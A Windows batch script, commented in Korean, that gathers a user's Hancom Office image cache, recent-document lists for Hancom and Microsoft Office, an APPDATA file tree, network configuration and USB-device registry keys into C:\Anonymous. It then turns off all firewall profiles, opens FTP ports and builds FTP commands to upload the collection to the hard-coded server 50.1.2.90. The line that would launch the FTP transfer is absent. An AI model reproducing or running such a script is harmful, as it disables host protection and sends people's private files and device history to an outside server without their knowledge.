@ECHO OFF 

REM * Setup 
MODE.COM CON COLS=98 LINES=30 >Nul 2>Nul
COLOR 3F

REM  폴더생성
CD C:\
MKDIR Anonymous
REM  숨김
REM ATTRIB +H C:\Anonymous
CD C:\Anonymous

MKDIR USB
REM ATTRIB +H C:\Anonymous\USB


REM 한컴오피스 이미지 추출
CD C:\Anonymous
MKDIR Image
REM ATTRIB +H C:\Anonymous\Image

ATTRIB -R %HOMEDRIVE%%HOMEPATH%\AppData\Local\Temp\Hnc\BinData
COPY %HOMEDRIVE%%HOMEPATH%\AppData\Local\Temp\Hnc\BinData\*.* C:\Anonymous\Image

REM 최근에 사용한 문서 추출
CD C:\Anonymous
MKDIR Recent
REM ATTRIB +H C:\Anonymous\Recent
ATTRIB -R %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Hnc\Office\Recent

CD %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Hnc\Office\Recent
dir >> C:\Anonymous\Recent\Recent_Data.txt
REM * COPY %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Hnc\Office\Recent\*.* C:\Anonymous\Recent

ATTRIB -R %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Office\Recent
CD %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Office\Recent
dir >> C:\Anonymous\Recent\Recent_Data2.txt

REM * COPY %HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Office\Recent\*.*  C:\Anonymous\Recent


REM 파일시스템 구조확인
CD %APPDATA%
TREE /F /A >> C:\Anonymous\Recent\APPDATA_Tree.txt

REM * CD /
REM * TREE /F /A >> C:\Anonymous\Recent\C_Tree.txt

REM * D:
REM * TREE /F /A >> C:\Anonymous\Recent\D_Tree.txt

REM * E:
REM * TREE /F /A >> C:\Anonymous\Recent\E_Tree.txt

REM * F:
REM * TREE /F /A >> C:\Anonymous\Recent\F_Tree.txt

REM 사용자 정보 추출
ipconfig >> C:\Anonymous\IP.txt

REM 레지스트리 추출
CD C:\Anonymous

COPY C:\Windows\inf\setupapi.dev.log C:\Anonymous\USB
CD C:\Anonymous\USB


REG EXPORT HKLM\SYSTEM\ControlSet001\Enum\USBSTOR C:\Anonymous\USB\USBSTOR1.REG /Y
REG EXPORT HKLM\SYSTEM\ControlSet002\Enum\USBSTOR C:\Anonymous\USB\USBSTOR2.REG /Y
REG EXPORT HKLM\SYSTEM\MountedDevices C:\Anonymous\USB\MountedDevices.REG /Y

REM * cd C:\

REM * zip -r C:\Anonymous.zip C:\Anonymous


REM ==============FireWall open====================
NetSh Advfirewall set allprofiles state off

netsh firewall set portopening TCP 20 "FTP_DATA" enable
netsh firewall set portopening TCP 21 "FTP" enable

REM ==============FTP====================

SETLOCAL EnableExtensions

REM Connection information:
SET Server=50.1.2.90
SET usrname=anonymous
SET pssword=password

REM ---- Do not modify anything below this line ----

SET Commands="%TEMP%SendToFTP_commands.txt"

REM FTP user name and password. No spaces after either.
ECHO %usrname%>%Commands%
ECHO %pssword%>>%Commands%

REM FTP transfer settings.
rem ECHO prompt>>%Commands%
ECHO binary>>%Commands%

@REM IP 추출 시작 ======================================
setlocal enabledelayedexpansion
ipconfig > %TEMP%\ip.data
set IP=x.x.x.x
for /F "delims= skip=12" %%i in (%TEMP%\ip.data) do (
	set a=%%i
	set a=!a:IPv4 주소 . . . . . . . . . : =!
	if !a! NEQ %%i (
		set IP=!a!
	) 
)
del %TEMP%\ip.data
ECHO|set /p=mkdir>>%Commands% & ECHO %IP% >> %Commands%
ECHO cd %IP%>>%Commands%
endlocal

@REM IP 추출 및 디렉토리 생성/이동 끗 ==================

ECHO mkdir Image>>%Commands%
ECHO mkdir Recent>>%Commands%
ECHO mkdir USB>>%Commands%

ECHO mput C:\Anonymous\*>>%Commands%
ECHO cd Image>>%Commands%
ECHO mput C:\Anonymous\Image\*>>%Commands%
ECHO cd ..>>%Commands%
ECHO cd Recent>>%Commands%
ECHO mput C:\Anonymous\Recent\*>>%Commands%
ECHO cd ..>>%Commands%
ECHO cd USB>>%Commands%
ECHO mput C:\Anonymous\USB\*>>%Commands%


REM Close the FTP connection.
ECHO close>>%Commands%
ECHO bye>>%Commands%

REM ==============FireWall close====================
NetSh Advfirewall set allprofiles state on
netsh firewall set portopening TCP 20 "FTP_DATA" disable
netsh firewall set portopening TCP 21 "FTP" disable